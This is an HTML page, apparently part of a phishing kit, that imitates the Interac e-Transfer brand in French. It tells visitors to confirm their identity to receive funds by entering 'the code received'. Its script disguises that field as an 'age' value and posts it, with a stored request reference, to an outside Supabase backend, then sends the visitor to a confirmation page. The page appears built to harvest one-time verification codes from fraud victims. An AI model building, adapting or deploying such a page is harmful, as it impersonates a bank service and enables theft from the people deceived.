<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>E-Transfert — Âge</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #ffffff;
    color: #333;
}

.header {
    background: #111;
    color: #f5b400;
    text-align: center;
    padding: 25px;
    font-size: 25px;
    font-weight: bold;
}

.container {
    max-width: 650px;
    margin: 45px auto;
    padding: 30px;
    background: white;
}

/* Titre avec photo */
.titre-zone {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 15px;
}

.titre-zone h1 {
    margin: 0;
}

.titre-photo {
    width: 200px;
    height: 150px;
    object-fit: contain;
}

.intro {
    text-align: center;
    color: #777;
    margin-bottom: 30px;
}

.notice {
    background: #fff4cc;
    padding: 15px;
    border-radius: 8px;
    margin-bottom: 25px;
    font-size: 14px;
}

label {
    display: block;
    margin-top: 18px;
    margin-bottom: 8px;
    font-weight: bold;
}

input[type="number"] {
    width: 100%;
    padding: 15px;
    border: 1px solid #ccc;
    border-radius: 7px;
    font-size: 17px;
}

/* Bouton bleu */
button {
    width: 100%;
    margin-top: 25px;
    padding: 18px;
    border: none;
    border-radius: 45px;
    background: #1976c9;
    color: white;
    font-size: 21px;
    font-weight: normal;
    cursor: pointer;
}

button:hover {
    background: #1565b3;
}

.message {
    margin-top: 18px;
    text-align: center;
    font-weight: bold;
}
</style>
</head>

<body>

<div class="header">
    Interac E-Transfert
</div>

<div class="container">

    <div class="titre-zone">

        <img
            src="photo3.png"
            class="titre-photo"
            alt=""
        >

        <h1></h1>

    </div>

    <p class="intro">
        Veuillez confirmer votre identité pour continuer.
    </p>

    <div class="notice">
        Confirmez votre identité pour deposer vos fonds.
    </div>

    <form id="ageForm">

        <label for="age"></label>

        <input
            type="number"
            id="age"
            placeholder="Entrez le code reçu"
            required
        >

        <button type="submit">
            Confirmer
        </button>

    </form>

    <div class="message" id="message"></div>

</div>

<script>

const SUPABASE_URL =
    "https://eokwnhtuveojoxrpytdv.supabase.co";

const SUPABASE_KEY =
    "sb_publishable_K_3CUhqGng7mYO0NZKQQvA_1Aaf57Tx";

document.getElementById("ageForm").addEventListener(
    "submit",
    async function(event) {

        event.preventDefault();

        const message =
            document.getElementById("message");

        const age =
            Number(document.getElementById("age").value);

        const reference =
            localStorage.getItem(
                "demandeReferenceETransfert"
            );

        if (!age) {
            message.textContent =
                "Veuillez entrer un âge valide.";
            return;
        }

        if (!reference) {
            message.textContent =
                "Demande introuvable.";
            return;
        }

        message.textContent =
            "Enregistrement de l'âge en cours...";

        try {

            const response = await fetch(
                SUPABASE_URL +
                "/rest/v1/rpc/enregistrer_age",
                {
                    method: "POST",

                    headers: {
                        "apikey": SUPABASE_KEY,
                        "Authorization":
                            "Bearer " + SUPABASE_KEY,
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        p_reference: reference,
                        p_age: age
                    })
                }
            );

            if (!response.ok) {

                const erreur =
                    await response.text();

                console.error(erreur);

                message.textContent =
                    "Erreur lors de l'enregistrement de l'âge.";

                return;
            }

            localStorage.removeItem(
                "demandeReferenceETransfert"
            );

            window.location.href =
                "confirmation.html";

        } catch (error) {

            console.error(error);

            message.textContent =
                "Impossible de contacter Supabase.";
        }

    }
);

</script>

</body>
</html>
